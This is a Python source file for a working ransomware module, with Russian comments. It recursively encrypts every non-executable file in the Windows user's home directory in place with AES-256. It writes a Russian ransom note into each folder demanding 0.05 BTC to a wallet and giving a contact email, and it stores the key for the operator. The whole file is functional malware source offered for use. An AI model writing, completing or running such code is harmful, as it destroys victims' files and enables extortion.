#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RansomwareStealer Module - Шифрует все файлы на хосте (только Windows) и требует выкуп
"""

import os
import sys
import json
import logging
import traceback
import platform
from pathlib import Path
from datetime import datetime
from typing import Dict, Any, Optional
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

logger = logging.getLogger("RansomwareStealer")

class RansomwareStealer:
    """
    Модуль для шифрования всех файлов на Windows и требования выкупа
    """
    
    def __init__(self, output_dir=None, wallet_address=None, ransom_amount="0.05 BTC"):
        self.output_dir = output_dir or os.path.join(os.getcwd(), "extracted_data/ransomware")
        os.makedirs(self.output_dir, exist_ok=True)
        self.wallet_address = wallet_address or "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        self.ransom_amount = ransom_amount
        self.ransom_note_name = "README_RESTORE_FILES.txt"
        self.key = get_random_bytes(32)  # AES-256
        self.iv = get_random_bytes(16)
        self.encrypted_key_file = os.path.join(self.output_dir, "ENCRYPTION_KEY.b64")
        self.encrypted_files = []
        self.failed_files = []
        self.sys_info = self._get_sys_info()

    def _get_sys_info(self) -> Dict[str, Any]:
        try:
            from agent_modules.environment_manager import EnvironmentManager
            env = EnvironmentManager()
            return env.collect_system_info()
        except Exception:
            return {"os": platform.system(), "hostname": platform.node()}

    def _is_windows(self) -> bool:
        return self.sys_info.get("os", "").lower().startswith("win") or platform.system().lower() == "windows"

    def _encrypt_file(self, file_path: str):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            # Padding
            pad_len = 16 - (len(data) % 16)
            data += bytes([pad_len]) * pad_len
            encrypted = cipher.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted)
            self.encrypted_files.append(file_path)
        except Exception as e:
            logger.error(f"Ошибка при шифровании {file_path}: {str(e)}")
            self.failed_files.append(file_path)

    def _write_ransom_note(self, dir_path: str):
        note_path = os.path.join(dir_path, self.ransom_note_name)
        note = (
            f"ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ!\n\n"
            f"Чтобы восстановить файлы, переведите {self.ransom_amount} на кошелек: {self.wallet_address}\n"
            f"После оплаты свяжитесь: iamtomasanderson@gmail.com\n"
            f"Укажите свой хост: {self.sys_info.get('hostname', 'unknown')}\n"
            f"\nЕсли вы попытаетесь восстановить файлы самостоятельно — они будут повреждены.\n"
            f"\nВаш уникальный ключ зашифрован и сохранен. После оплаты вы получите инструкцию по расшифровке.\n"
        )
        try:
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(note)
        except Exception as e:
            logger.error(f"Ошибка при записи ransom note: {str(e)}")

    def _encrypt_key(self):
        # Сохраняем ключ и IV в base64 (для оператора)
        try:
            with open(self.encrypted_key_file, 'w') as f:
                f.write(base64.b64encode(self.key).decode() + '\n')
                f.write(base64.b64encode(self.iv).decode() + '\n')
        except Exception as e:
            logger.error(f"Ошибка при сохранении ключа: {str(e)}")

    def _walk_and_encrypt(self, root_dir: str):
        for dirpath, dirnames, filenames in os.walk(root_dir):
            # Пишем ransom note в каждую папку
            self._write_ransom_note(dirpath)
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                # Пропускаем системные и критические файлы
                if filename.lower() in [self.ransom_note_name.lower(), 'ntldr', 'bootmgr', 'pagefile.sys', 'hiberfil.sys', 'desktop.ini']:
                    continue
                if not os.path.isfile(file_path):
                    continue
                # Пропускаем исполняемые файлы Windows
                if file_path.lower().endswith(('.exe', '.dll', '.sys', '.bat', '.cmd', '.msi')):
                    continue
                self._encrypt_file(file_path)

    def run(self) -> Dict[str, Any]:
        logger.info("Запуск ransomware-шифрования...")
        if not self._is_windows():
            return {"status": "error", "message": "Ransomware работает только на Windows"}
        try:
            # Шифруем все файлы пользователя
            home = str(Path.home())
            self._walk_and_encrypt(home)
            # Сохраняем ключ
            self._encrypt_key()
            # Итоговый отчет
            result = {
                "status": "success",
                "total_encrypted": len(self.encrypted_files),
                "total_failed": len(self.failed_files),
                "encrypted_files": self.encrypted_files[:10],  # Только первые 10 для отчета
                "failed_files": self.failed_files[:10],
                "key_file": self.encrypted_key_file,
                "wallet": self.wallet_address,
                "ransom_amount": self.ransom_amount,
                "system": self.sys_info.get("os", "unknown"),
                "hostname": self.sys_info.get("hostname", "unknown")
            }
            # Сохраняем отчет
            report_file = os.path.join(self.output_dir, "ransomware_report.json")
            with open(report_file, 'w') as f:
                json.dump(result, f, indent=2)
            result["report_file"] = report_file
            return result
        except Exception as e:
            logger.error(f"Ошибка в ransomware: {str(e)}")
            return {"status": "error", "message": str(e), "traceback": traceback.format_exc()}

def main():
    """Main function to run the ransomware stealer module"""
    import sys
    try:
        output_dir = sys.argv[1] if len(sys.argv) > 1 else None
        wallet = sys.argv[2] if len(sys.argv) > 2 else None
        stealer = RansomwareStealer(output_dir, wallet)
        result = stealer.run()
        print(json.dumps(result, indent=2, ensure_ascii=False))
    except Exception as e:
        print(f"Error running ransomware stealer: {str(e)}")
        traceback.print_exc()

if __name__ == "__main__":
    main() 